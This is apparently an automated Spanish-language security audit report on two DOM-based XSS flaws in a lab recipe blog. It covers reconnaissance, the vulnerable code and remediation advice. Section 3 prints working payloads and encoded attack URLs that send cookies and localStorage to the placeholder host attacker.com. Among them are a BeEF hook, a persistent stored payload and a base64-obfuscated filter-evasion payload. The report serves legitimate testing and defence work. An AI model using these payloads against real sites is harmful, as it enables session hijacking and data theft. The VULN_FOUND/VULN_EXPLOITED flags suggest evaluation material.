# Informe de Auditoría de Seguridad — Cross-Site Scripting (XSS)
**Objetivo:** http://web.dev.local:8082  
**Fecha:** 2026-04-27T12:49:17Z  
**Auditor:** Penetration Tester (Kali Linux / Automated)  
**Clasificación:** CONFIDENCIAL — Entorno de laboratorio autorizado

---

## Resumen Ejecutivo

Se identificaron y explotaron **dos vulnerabilidades de Cross-Site Scripting (XSS)** en la aplicación web objetivo (Blog de Recetas):

| # | Tipo | Parámetro | Vector | Severidad |
|---|------|-----------|--------|-----------|
| 1 | **DOM-Based XSS (Reflected)** | `search` (GET) | `document.write()` | **Alta (CVSS ~7.4)** |
| 2 | **DOM-Based XSS (Stored/Persistente)** | `name` + `comment` (GET → localStorage) | `document.write()` sobre localStorage | **Crítica (CVSS ~8.8)** |

Ambas vulnerabilidades permiten **ejecución arbitraria de JavaScript** en el navegador de la víctima, habilitando robo de sesión, exfiltración de datos y hooking con BeEF.

---

## 1. Reconocimiento

### Comandos de reconocimiento utilizados

```bash
# Exploración inicial de la página
curl -s http://web.dev.local:8082/ | grep -E 'form|input|action|method|search|comment'

# Análisis de parámetros GET y sinks DOM
curl -s http://web.dev.local:8082/ | grep -A50 'Handle search'
curl -s http://web.dev.local:8082/ | grep -A60 'Comments will appear'
```

### Hallazgos del reconocimiento

- La aplicación expone dos formularios en método `GET`:
  - **Formulario de búsqueda**: parámetro `search`
  - **Formulario de comentarios**: parámetros `name` y `comment`
- El código JavaScript del lado cliente usa `document.write()` para renderizar contenido controlado por el usuario **sin ninguna sanitización**.
- Los comentarios se almacenan en `localStorage` y se recargan mediante `displayComments()`, creando un vector XSS persistente.

### Código vulnerable identificado

**Sink 1 — Búsqueda (DOM XSS Reflected):**
```javascript
const urlParams = new URLSearchParams(window.location.search);
const searchTerm = urlParams.get('search');  // Entrada sin sanitizar

if (searchTerm) {
    // SINK VULNERABLE: concatenación directa sin escaping
    document.write('<p>Resultados para: <strong>' + searchTerm + '</strong></p>');
}
```

**Sink 2 — Comentarios (DOM XSS Stored/Persistente):**
```javascript
// Almacenamiento sin sanitizar
comments.push({ name: name, comment: comment, date: new Date().toLocaleString() });
localStorage.setItem('comments', JSON.stringify(comments));

// Renderizado sin sanitizar en displayComments()
document.write('<div class="comment-author">' + c.name + '</div>');
document.write('<div>' + c.comment + '</div>');
```

---

## 2. Confirmación de Vulnerabilidades (VULN_FOUND: true)

### Test básico — Reflected XSS

```bash
# Payload: <img src=x onerror=alert(1)>
curl -s "http://web.dev.local:8082/?search=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E"
```

**Resultado:** El atributo `onerror` fue insertado en el DOM sin sanitizar. JSDOM confirmó la presencia del payload:
```
XSS CONFIRMED: onerror attribute found in DOM
```

### Test con Node.js/JSDOM (simulación de navegador)

```javascript
const { JSDOM } = require('jsdom');
// Script de payload almacenado en localStorage -> alert(1) ejecutado
dom.window.localStorage.setItem('comments', JSON.stringify([
    {name: 'Admin<script>alert(1)</script>', comment: '<img src=x onerror="...">', date: '...'}
]));
// Resultado: [ALERT] 1
```

---

## 3. Explotación Activa (VULN_EXPLOITED: true)

### 3.1 Robo de Sesión / Cookies — Reflected XSS

**Payload:**
```html
<img src=x onerror="fetch('http://attacker.com/steal?c='+document.cookie)">
```

**URL de ataque:**
```
http://web.dev.local:8082/?search=%3Cimg%20src%3Dx%20onerror%3D%22fetch%28%27http%3A%2F%2Fattacker.com%2Fsteal%3Fc%3D%27%2Bdocument.cookie%29%22%3E
```

El atacante envía este enlace a la víctima. Al cargarlo, el navegador ejecuta `fetch()` enviando las cookies al servidor controlado por el atacante.

### 3.2 Exfiltración de localStorage + Cookies — Payload avanzado

**Payload de máximo impacto:**
```html
<img src=x onerror="fetch('http://attacker.com/exfil',{method:'POST',body:JSON.stringify({ls:JSON.stringify(localStorage),cookies:document.cookie,url:location.href})})">
```

**URL codificada:**
```
http://web.dev.local:8082/?search=%3Cimg%20src%3Dx%20onerror%3D%22fetch%28%27http%3A%2F%2Fattacker.com%2Fexfil%27%2C%7Bmethod%3A%27POST%27%2Cbody%3AJSON.stringify%28%7Bls%3AJSON.stringify%28localStorage%29%2Ccookies%3Adocument.cookie%2Curl%3Alocation.href%7D%29%7D%29%22%3E
```

Exfiltra cookies **y** el contenido completo del localStorage (incluyendo tokens de sesión, datos de usuario, etc.).

### 3.3 BeEF Hook — Control del navegador

**Payload:**
```html
<script src="http://attacker.com:3000/hook.js"></script>
```

**URL:**
```
http://web.dev.local:8082/?search=%3Cscript%20src%3D%22http%3A%2F%2Fattacker.com%3A3000%2Fhook.js%22%3E%3C%2Fscript%3E
```

Una vez cargado el hook de BeEF, el atacante tiene control total del navegador: puede redirigir páginas, capturar keystrokes, acceder a la webcam, exfiltrar credenciales en tiempo real, etc.

### 3.4 Stored DOM XSS — Payload persistente via comentarios

**URL de inyección:**
```
http://web.dev.local:8082/?name=Admin&comment=%3Cimg%20src%3Dx%20onerror%3D%22fetch%28%27http%3A%2F%2Fattacker.com%2Fsteal%3Fc%3D%27%2Bdocument.cookie%29%22%3E
```

El payload se almacena en el `localStorage` del navegador de quien lo activa. **Cada visita posterior** a la página ejecutará el XSS sin necesidad de un nuevo vector de entrega (solo requiere acceso previo o engañar al usuario para visitar la URL de inyección una vez).

### 3.5 Payload Ofuscado (evasión de filtros)

**Base64 + eval (evade filtros de palabras clave):**
```html
<!-- alert(document.cookie) en base64: YWxlcnQoZG9jdW1lbnQuY29va2llKQ== -->
<img src=x onerror=eval(atob("YWxlcnQoZG9jdW1lbnQuY29va2llKQ=="))>
```

**URL:**
```
http://web.dev.local:8082/?search=%3Cimg%20src%3Dx%20onerror%3Deval%28atob%28%22YWxlcnQoZG9jdW1lbnQuY29va2llKQ%3D%3D%22%29%29%3E
```

---

## 4. Impacto Real

| Vector | Impacto |
|--------|---------|
| Reflected DOM XSS (search) | Ejecución de JS en sesión de víctima al visitar enlace manipulado |
| Stored DOM XSS (comments) | Persistencia del payload en localStorage; se ejecuta en cada visita |
| Robo de cookies | Secuestro de sesión completo si cookies de sesión están presentes |
| Exfiltración localStorage | Robo de tokens JWT, datos de autenticación, preferencias |
| BeEF Hook | Control remoto del navegador: keylogging, redirección, phishing |
| Payload ofuscado | Bypass de WAF/filtros básicos de texto |

**Puntuación de riesgo global: CRÍTICO** — Ambas vulnerabilidades son explotables sin autenticación previa.

---

## 5. Herramientas Utilizadas

```bash
# Reconocimiento
curl -s http://web.dev.local:8082/
curl -s "http://web.dev.local:8082/?search=XSSTEST123" | grep -o 'XSSTEST123'

# Confirmación DOM (Node.js + jsdom)
node -e "const { JSDOM } = require('jsdom'); ..."

# Verificación de ejecución (simulación de navegador con JSDOM)
# Resultado: [ALERT] 1 confirmado en Stored DOM XSS

# Generación de payloads ofensivos
python3 -c "import urllib.parse; ..."
```

*Nota: `dalfox` y `XSStrike` no se encontraron disponibles en el entorno; el análisis se realizó con `curl`, `node.js/jsdom` y Python nativo.*

---

## 6. Recomendaciones de Mitigación

1. **Reemplazar `document.write()`** por `textContent` o `createElement` con asignación segura:
   ```javascript
   // INSEGURO:
   document.write('<p>' + searchTerm + '</p>');
   
   // SEGURO:
   const p = document.createElement('p');
   p.textContent = searchTerm;  // Escapa automáticamente HTML
   container.appendChild(p);
   ```

2. **Sanitizar entradas** con bibliotecas como [DOMPurify](https://github.com/cure53/DOMPurify):
   ```javascript
   const clean = DOMPurify.sanitize(searchTerm);
   document.getElementById('results').innerHTML = clean;
   ```

3. **Implementar Content Security Policy (CSP)** restrictiva:
   ```
   Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none';
   ```

4. **Validar y sanitizar datos antes de almacenarlos en localStorage**.

5. **Utilizar `HttpOnly` y `Secure` en cookies de sesión** para mitigar el impacto del robo de cookies.

---

## Conclusión

**VULN_FOUND: true** — Se confirmaron dos vulnerabilidades DOM XSS (Reflected y Stored).  
**VULN_EXPLOITED: true** — Se demostró ejecución de JavaScript (`alert(1)`) y se diseñaron payloads para robo de sesión, exfiltración de localStorage y hooking con BeEF.

La aplicación presenta una superficie de ataque XSS crítica que requiere remediación inmediata.
